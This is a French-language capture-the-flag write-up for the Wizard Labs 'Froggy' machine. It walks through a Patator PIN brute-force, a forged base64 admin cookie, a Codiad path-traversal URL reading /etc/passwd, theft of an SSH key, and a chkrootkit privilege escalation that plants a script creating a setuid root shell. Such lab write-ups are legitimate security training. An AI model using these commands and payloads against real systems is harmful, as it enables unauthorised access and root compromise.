# Solution du CTF Froggy de Wizard Labs

Froggie jumped all over the stage that day
------------------------------------------

*Froggy* est un CTF basé Linux proposé sur la plateforme *Wizard Labs*.  

Via un buster avec une liste assez large de paths potentiels on trouve différents dossiers mais surtout une zone membre :  

```plain
/images (Status: 301)
/thumbnail (Status: 301)
/server-status (Status: 403)
/grid (Status: 301)
/memberarea (Status: 301)
```

dans cette zone on peut trouver des pages PHP mais elles nécessitent une authentification :  

```plain
/index.php (Status: 200)
/login.php (Status: 200)
/register.php (Status: 200)
/test.php (Status: 200)
/update.php (Status: 302)
/database (Status: 301)
/logout.php (Status: 302)
/config.php (Status: 200)
/forgot.php (Status: 200)
/editor (Status: 301)
/dashboard.php (Status: 302)
/remove.php (Status: 200)
```

Le script *forgot.php* correspond évidemment à un script de récupération de mot de passe. Il est tout de même assez inhabituel puisqu'il ne demande qu'un PIN.  

Partant du principe qu'un PIN est généralement numérique on peut utiliser Patator pour trouver les PIN qui ne sont pas invalides :  

```bash
patator http_fuzz url='http://10.1.1.56/memberarea/forgot.php' method=POST body='forgotpass=Check&secretpin=RANGE0' 0=int:0-10000 -x ignore:fgrep='Sercet pin not matched'
```

NB: la typo fait partie du challenge.  

Avec un PIN de 0 on obtient un message différent : *Please enter your secret pin to view your password.*  

Hmmm étrange mais pas vraiment utile :-/   

Puisque le site le permet j'ai créé un compte dans cette zone membre et une fois connecté on peut clairement voir un cookie nommé *membersession* qui contient le base64 correspondant au compte que je viens de créer (*devloop*).  

Il suffit d'éditer le cookie pour y mettre le base64 de *admin* puis on retourne sur le dashboard qui nous livre ses secrets :  

> Welcome admin  
> 
>   
> 
> Your Notes : Need to beautify our gallery using '83VbbDGjefTnM9wQ' as Password

Codiadwnage
-----------

Où utiliser ces identifiants ?  

Toujours sous */memberarea* on trouve un dossier nommé *editor* qui est un IDE web baptisé [Codiad](http://codiad.com/).  

Pas grand chose d'intéressant à y voir une fois connecté, toutefois ce soft semble vulnérable :  

```plain
$ searchsploit codiad
----------------------------------------- ----------------------------------------
 Exploit Title                           |  Path
                                         | (/usr/share/exploitdb/)
----------------------------------------- ----------------------------------------
Codiad 2.4.3 - Multiple Vulnerabilities  | exploits/php/webapps/35585.txt
Codiad 2.5.3 - Local File Inclusion      | exploits/php/webapps/36371.txt
----------------------------------------- ----------------------------------------
Shellcodes: No Result
```

La faille d'inclusion locale est très facile à exploiter :  

```plain
http://10.1.1.56/memberarea/editor/components/filemanager/download.php?path=../../../../../../../../../../../etc/passwd&type=undefined
```

On note la présence de deux utilisateurs :  

```plain
sysadm:x:1001:1001:,,,:/home/sysadm:/bin/bash
ahmed:x:1002:1002:,,,:/home/ahmed:/bin/bash
```

La clé privée SSH de *ahmed* est récupérable et nous permet d'obtenir notre shell ainsi que le premier flag :)  

On reçoit aussi une notification de réception d'un email :  

```plain
You have mail.
Last login: Sat Feb 23 10:27:50 2019 from 192.168.0.30
ahmed@froggy:~$ mail
-bash: mail: command not found
ahmed@froggy:~$ ls /var/spool/mail
ahmed
ahmed@froggy:~$ ls /var/spool/mail/ahmed
/var/spool/mail/ahmed
ahmed@froggy:~$ ls /var/spool/mail/ahmed  -lh
-rwx------ 1 ahmed ahmed 367 Feb 22 14:56 /var/spool/mail/ahmed
ahmed@froggy:~$ cat /var/spool/mail/ahmed
From: SysAdmin <sysadm@localhost.localdomain>
To: Ahmed <ahmed@localhost.localdomain>
Subject: Vulnerable Program

Dear Ahmed !

While I was visiting some hacker websites I discovered an "public exploit " for our anti-rootkit utility ...

It's surely disappointing for us but I did my best to make the exploit unusable for any attacker .

Your Lovely SysAdmin  !!
```

Cuisses de grenouilles
----------------------

Au début je me suis dirigé vers l'idée d'un script custom à exploiter, j'ai donc fouillé un droite à gauche.  

L'utilisateur *sysadm* ne dispose d'aucun fichier vraiment intéressant.  

Après avoir récupéré les identifiants SQL j'ai trouvé le mot de passe admin de la zone membre ainsi que les PINs, ce qui explique le message de tout à l'heure.  

```plain
$ mysql -u membership -p member
Enter password:
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 50060
Server version: 10.1.37-MariaDB-0+deb9u1 Debian 9.6

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [member]> show tables;
+------------------+
| Tables_in_member |
+------------------+
| pdo              |
+------------------+
1 row in set (0.00 sec)

MariaDB [member]> select * from pdo;
+----+----------+----------+------------------+-----------+
| id | fullname | username | password         | secretpin |
+----+----------+----------+------------------+-----------+
|  1 | admin    | admin    | Gw-LfcrjC-4hr6>g |         0 |
|  2 | test     | test     | test             |         0 |
|  3 | devloop  | devloop  | devloop          |    123456 |
+----+----------+----------+------------------+-----------+
3 rows in set (0.26 sec)
```

Je suis alors parti sur l'idée que *chkrootkit* soit exécuté via un *crontab* puisque je savais qu'une faille existait pour ce logiciel (forcément ça en a fait rigoler quelques uns).  

Le binaire est bien présent sur le système mais est-il exécuté ? J'ai eu recours une nouvelle fois à mon script de surveillance des process ([voir CTF Homeless](http://devloop.users.sourceforge.net/index.php?article150/solution-du-ctf-homeless-de-vulnhub)) :  

```bash
23961 root /usr/sbin/CRON -f
23962 root /bin/sh -c    chkrootkit
23963 root /bin/sh /usr/bin/chkrootkit
24205 root /bin/echo -n Checking `inetd'...
24466 root grep -E check_global_passwd|panasonic|satori|vejeta|\.ark|/hash\.zk
24492 root /bin/ps auwx
24493 root grep -E xinetd
24494 root grep -E -v grep
24589 root /usr/bin/find /dev /tmp /lib /etc /var ( -name tcp.log -o -name .linux-sniff -o -name sniff-l0g -o -name core_ )
24610 root find /lib /usr/lib /usr/local/lib -name libproc.a
24643 root /usr/bin/find /usr/lib /lib -name .[A-Za-z]* -o -name ...* -o -name .. *
24654 root /usr/bin/find /usr/lib /lib -type d -name .*
24695 root /usr/bin/find /usr/lib -name last.cgi
24708 root /usr/bin/find /usr/lib /usr/bin -name red.tar -o -name start.sh -o -name klogd.o -o -name 0anacron-bak -o -name adore
24777 root /bin/sh /usr/bin/chkrootkit
24778 root /usr/bin/strings /sbin/init
24779 root grep -E HOME
24856 root /bin/sh /usr/bin/chkrootkit
24857 root /usr/bin/find /tmp /var/tmp -type f -exec head -n 1 {} ;
24858 root grep -E #!.*php
25025 root /bin/sh /usr/bin/chkrootkit
25026 root find /proc
25027 root wc -l
```

L'exploit présent [sur exploit-db](https://www.exploit-db.com/exploits/33899) indique que chkrootkit va exécuter les scripts présents dans la variable *SLAPPER\_FILES*.  

L'exploit donnait un exemple avec le script */tmp/update* donc au début je ne suis pas allé plus loin mais voyant que rien ne s'exécutait j'ai regardé le code (chkrootkit est écrit en bash) et la liste variable était différente :  

```bash
SLAPPER_FILES="${ROOTDIR}dev/shm/slapper"
```

J'ai donc écrit un script bash à cet emplacement :  

```bash
#!/bin/bash
cp /bin/dash /tmp/devloop_was_here
chmod 4755 /tmp/devloop_was_here
```

Cette fois notre script est bien exécuté:  

```bash
2890 root /bin/sh /usr/bin/chkrootkit
2891 root /usr/bin/find /tmp /var/tmp -type f -exec head -n 1 {} ;
2892 root grep -E #!.*php
2937 root /bin/netstat -an
2938 root grep -E ^tcp.*LIST|^udp
2939 root grep -E [.:]145[^0-9.:]
--- snip ---
3041 root /bin/netstat -an
3042 root grep -E ^tcp.*LIST|^udp
3043 root grep -E [.:]47889[^0-9.:]
3062 root /bin/sh /usr/bin/chkrootkit
3063 root find /proc
3064 root wc -l
3130 root /bin/bash /dev/shm/slapper
3131 root [cp]
3133 root [chmod]
```

```plain
$ ./devloop_was_here
# cd /root
# ls
proof.txt  root.txt
# cat root.txt
5bbfc6a26697caaaa66b1eefb8d3a1a0699ab51c
```


*Published May 21 2019 at 18:09*